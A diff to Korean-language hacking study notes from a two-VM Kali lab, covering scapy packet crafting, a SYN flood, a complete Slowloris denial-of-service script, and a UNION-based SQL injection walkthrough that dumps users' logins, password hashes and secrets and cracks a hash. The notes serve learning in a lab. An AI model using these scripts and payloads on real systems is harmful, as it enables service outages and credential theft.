@@ -673,7 +673,13 @@ fragrouter -B1
 
 fragrouter : base-1 : normal IP  forwarding
 
-##### ettercap
+
+
+##### MTM (Man In The Middle) attack 
+
+- 두 호스트 간에 통신을 하고 있을 때, 중간자가 사이에 끼어들어 통신 내용을 도청, 조작하는 공격
+
+ettercap
 
 - LAN 환경에서 중간자 공격을 수행할 수 있도록 구현한 프로그램
 - GUI 제공 
@@ -738,6 +744,7 @@ Kali#1에서 wireshake를 키고
 kali#2에서 다음 명령어를 실행
 
 - nmap -sT 호스트\_IP
+- nmap -sT 호스트_IP -p portNumber
 
 
 
@@ -755,3 +762,246 @@ Stealth Scan
 
   ==> 포트가 열려 있으면 무응답
   ==> 포트가 닫혀 있으면 RST/ACK가 온다
+
+
+
+##### scapy
+
+- 파이썬으로 만들어져 있는 패킷 조작 도구
+- 패킷 디코딩, 전송, 캡쳐, 수정 등 다양한 기능들 제공
+- https://www.itlkorea.kr/data/scapy-pocket-guide0.2.pdf
+
+<br>
+
+- **실습**
+  - IP 정보를 받아와서 확인
+    - \>>> ip = IP()
+    - \>>> ip.display()
+  - 목적지 IP주소를 Kali#1으로 변경 후 IP정보를 확인
+    - \>>> ip.dst = "192.168.111.130"
+    - \>>> ip.display()
+  - TCP 정보를 가져와서 확인
+    - \>>> tcp = TCP()
+    - \>>> tcp.display()
+  - 출발지 포트번호를 랜덤하게 생성 후 TCP 정보를 확인
+    - \>>> tcp.sport = RandNum(1024, 65535)
+    - \>>> tcp.display()
+  - SYN 패킷을 생성
+    - \>>> syn = ip/tcp
+  - SYN 패킷을 전송 후 첫번째 응답이 올 때까지 대기
+    - \>>> syn_ack = sr1(syn)
+  - SYN_ACK 패킷 확인
+    - \>>> syn_ack.display()
+  - ACK 패킷 생성
+    - \>>> ack = ip/TCP(sport=syn_ack[TCP].dport, dport=80, flags="A", seq=syn_ack[TCP].ac, ack=syn_ack[TCP].seq+1)
+  - ACK 패킷 전송
+    - \>>> send(ack)
+
+
+
+칼리#2에서 명령어 창에서 scapy 입력
+
+
+
+##### TCP SYN Flooding 
+
+- syn 쿠키 초기화
+  - 칼리#1에서 sysctl -a | grep syncookies 명령어 실행
+    
+    - net.ipv4.tcp_syncookies = 1 >> 백로그 큐를 사용하지 않는다 ==> 응답이 없으면 바로 끊어버리는 것
+  
+  - sysctl -w net.ipv4.tcp_syncookies=0
+  
+  - Kali#2에서 RST 패킷이 외부로 나가지 않게 설정
+  
+    - \# iptables -A OUTPU -p tcp --tcp-flags RST RST -j DROP
+  
+  - Kali#2 방화벽 정책 확인
+  
+    - \# iptables -L -n
+  
+      Chain OUTPUT(policy ACCEPT)
+  
+      target port opt source destination
+  
+      DROP tcp -- 0.0.0.0/0 0.0.0.0/0 tcp flags:0x04/0x04
+  
+  - Kali#2에서 SYN flooding 공격
+  
+    - \>>> ip = IP()
+    - \>>> ip.dst = "192.168.111.130"  (Kali#1의 IP)
+    - \>>> tcp = TCP()
+    - \>>> tcp.dport = 80
+    - \>>> tcp.sport = RandNum(1024, 65535)
+    - \>>> tcp.flags = "S"
+    - \>>> syn = ip/tcp
+    - \>>> send(syn, loop=True)
+  
+  - Kali#1에서 공격 확인
+  
+    - wireshack 에서 패킷 확인
+    - \# netstat -an | grep -i syn_recv  명령어로 네트워크 상태 확인
+  
+
+##### Slowloris Attack
+
+- HTTP 요청 헤더와 본문이 개행문자로 구분되는 특징을 이용한 공격
+- 헤더의 끝을 나타내는 개행문자를 전달하지 않아 서버가 연결을 유지하도록 하는 공격
+
+- slowloris.py 등의 이미 짜여져 있는 파일을 사용
+
+```python
+
+#! /usr/bin/env python
+
+import sys
+import time
+from scapy.all import *
+
+def slowloris (target, num) :
+    print "start connect > {}".format(target)
+    syn = []
+    for i in range(num) :
+        syn.append(IP(dst=target)/TCP(sport=RandNum(1024,65535),dport=80,flags='S'))
+    syn_ack = sr(syn, verbose=0)[0]
+
+    ack = []
+    for sa in syn_ack :
+        payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1,num))) +\
+        "Host: {}\r\n".format(target) +\
+        "User-Agent: Mozilla/4.0\r\n" +\
+        "Content-Length: 42\r\n"
+
+        ack.append(IP(dst=target)/TCP(sport=sa[1].dport,dport=80,flags="A",seq=sa[1].ack,ack=sa[1].seq+1)/payload)
+    
+    answer = sr(ack, verbose=0)[0]
+    print "{} connection success!\t Fail: {}".format(len(answer), num-len(answer))
+    print "Sending data \"X-a: b\\r\\n\".."
+
+    count = 1
+    while True :
+        print "{} time sending".format(count)
+        ack = []
+        for ans in answer :
+            ack.append(IP(dst=target)/TCP(sport=ans[1].dport,dport=80,flags="PA",seq=ans[1].ack,ack=ans[1].seq)/"X-a: b\r\n")
+        answer = sr(ack, inter=0.5, verbose=0)[0]
+        time.sleep(10)
+        count += 1
+
+if __name__ == "__main__" :
+    if len(sys.argv) < 3 :
+        print "Usage: {} <target> <number of connection>".format(sys.argv[0])
+        sys.exit(1)
+    slowloris(sys.argv[1], int(sys.argv[2]))
+
+```
+
+Kali#1에서 서버 재 기동후 서버 상태 확인 및 wireshark 실행
+
+\# service apache2 stop
+
+\# service apache2 start
+
+http://localhost/server-status 접속
+
+<br>
+
+Kali#2에서 아래 명령어를 실행
+
+\# python slowloris.py KALI#1_IP 50
+
+
+
+
+
+##### sql injection
+
+Kali#1 : server 
+
+Kali#2 : client
+
+- man 이라는 단어를 입력해서 검색을 요청
+- 서버에서 클라이언트에게 받은 파라미터로 데이타베이스에서 sql구문을 사용해서 값을 조회
+- 조회된 값을 클라이언트에게 응답
+
+[화면]
+
+제목 : **man**
+
+[전달 << 요청 파라미터를 통해서 전달]
+
+sol_1.php?title=**man**
+
+[사용 >> 쿼리문을 만드는데 사용될 것으로 유추]
+
+select * from movies arer title = **'man'**
+
+<br>
+
+1. 입력값이 전달 및 사용 과정에서 아무런 조작이 발생하지 않는지 궁금???
+
+[화면]
+
+제목 : **man`**
+
+[전달 << 요청 파라미터를 통해서 전달]
+
+sol_1.php?title=**man`**
+
+[사용 >> 쿼리문을 만드는데 사용될 것으로 유추]
+
+select * from movies arer title = **'man`'**
+
+<br>
+
+실행결과
+
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
+
+---> 백엔드 DB가 MySQL이라는 정보와 화면에서 입력한 값은 그대로 쿼리 생성 및 실행에 사용된다.
+
+<br>
+
+2. 정상적인 쿼리가 반환하는 컬럼의 개수를 확인
+
+select * fro mives where title = '%**man ' order by 1 --**%'  <--- 제목이 man으로 끝나는 영화를 조회해서 첫번째 컬럼으로 정렬
+
+
+
+select * fro mives where title = '%**man ' order by 1 --**%' 
+
+~
+
+select * fro mives where title = '%**man ' order by 8 --**%'
+
+--> Error: Unknonw column '8' in ' order clause'
+
+--> 정상적인 쿼리가 반환하는 컬럼의 개수는 7개이다
+
+<br>
+
+3. 정상적인 쿼리의 실행의 결과에 공격자가 원하는 쿼리의 실행 결과를 결합해서 화면에 출력
+
+select * from movies where title = '%**man' UNION select 1,2,3,4,5,6,7 --** %'
+
+화면 출력을 위해서는 쿼리 실행 결과에서 2, 3, 4, 5번째 컬럼의 정보만 사용
+
+<br>
+
+4. MySQL의 시스템 테이블을 이용해서 사용자 정의 테이블의 정보(이름)을 조회select * from movies where title = '%man' UNION select 1,table_schema,table_name,4,5,6,7 from information_schema.tables -- %'→ https://dev.mysql.com/doc/refman/8.0/en/tables-table.html 참조
+
+5. 테이블 이름이 users인 테이블이 가지고 있는 컬럼 정보를 조회select * from movies where title = '%man' UNION select 1,table_name,column_name,4,5,6,7 from information_schema.columns where table_name = 'users' -- %'→ https://dev.mysql.com/doc/refman/8.0/en/columns-table.html
+6. users 테이블 id, login, password, email, secret 컬럼의 정보를 조회select * from movies where title = '%man' UNION select 1,id,login,password,concat(email, " : ", secret),6,7 from users -- %'
+7.  패스워드 정보가 안전하게 저장되어 있는지 확인6885858486f31043e5839c735d99457f045affd0https://crackstation.net/
+
+
+
+---
+
+**책**
+
+웹 해킹&보안 완벽 가이드 
+
+브라우저 해킹 vs 보안
+
+---
